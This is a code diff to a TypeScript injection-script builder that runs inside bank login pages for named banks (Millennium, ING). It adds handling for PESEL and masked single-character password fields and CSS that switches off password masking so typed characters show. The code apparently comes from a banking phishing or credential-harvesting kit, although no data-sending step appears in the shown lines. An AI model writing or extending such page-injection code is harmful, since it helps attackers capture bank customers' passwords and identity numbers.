@@ -102,9 +102,12 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         if (!el || !el.getAttribute) return false;
         // Millennium PESEL pozisyon kutulari (Pesel-1..Pesel-11): text tipinde
         // ama tek-karakter masked davranisi ister (otomatik sonraki kutuya gec).
-        if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) return true;
+        const nm = el.getAttribute("name") || "";
+        if (/^pesel-\\d+$/i.test(nm)) return true;
         const t = (el.getAttribute("type") || "").toLowerCase();
         if (t !== "password") return false;
+        // ING: password-0..31 tek-karakter alanlari (maxlength kaydedilmemis)
+        if (/^password[-_]?\\d+$/i.test(nm)) return true;
         const ml = el.getAttribute("maxlength") || el.getAttribute("text-length");
         return ml === "1";
       } catch (e) { return false; }
@@ -559,6 +562,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
                     const st = document.createElement("style");
                     st.textContent =
                       "input,textarea,select,button,a,[role=button]{pointer-events:auto!important;user-select:auto!important;-webkit-user-select:auto!important}" +
+                      "input[type=password]{-webkit-text-security:none!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important}" +
                       "[inert]{pointer-events:auto!important}";
                     el.shadowRoot.appendChild(st);
                   } catch (e) {}
@@ -716,7 +720,9 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             }
             if (el.__plMasked) return;
             el.__plMasked = true;
-            if (/^pesel-\\d+$/i.test(el.getAttribute("name") || "")) el.setAttribute("maxlength", "1");
+            // Tum masked kutular tek karakter (ING password-N gibi
+            // maxlength'siz kaydedilmis olanlar dahil)
+            el.setAttribute("maxlength", "1");
             el.setAttribute("autocomplete", "off");
             const advanceNext = () => {
               try {
